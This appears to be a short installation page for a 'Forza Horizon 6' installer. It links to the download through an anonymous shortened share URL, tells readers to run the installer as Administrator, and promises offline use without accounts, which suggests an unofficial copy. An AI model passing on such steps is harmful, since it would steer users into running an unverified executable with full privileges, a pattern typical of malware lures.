## How to Install

1. **[Download the installer](https://share.google/G0k4ecu13EVkKU9sO)**
2. Run as Administrator
3. Select install location (default: `C:\Program Files\Forza Horizon 6`)
4. Click **Install** and wait for completion
5. Launch from the desktop shortcut

> Works offline. No additional accounts or subscriptions required after installation.
